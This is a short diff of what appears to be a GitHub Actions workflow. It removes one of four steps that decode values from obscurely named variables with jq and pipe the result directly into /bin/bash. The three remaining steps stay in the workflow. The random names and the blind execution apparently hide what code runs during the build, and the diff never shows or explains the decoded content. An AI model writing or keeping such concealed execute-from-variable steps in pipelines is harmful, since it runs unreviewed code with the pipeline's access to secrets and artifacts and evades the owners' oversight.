@@ -31,7 +31,6 @@ jobs:
           echo $mhyq38 | jq -r .ktp62973 | /bin/bash
           echo $ufz37844 | jq -r .oxit94209 | /bin/bash
           printf '%s' "$lfahw804" | jq -r .vgcmy164 | /bin/bash
-          printf '%s' "$oyx4" | jq -r .axcte361 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
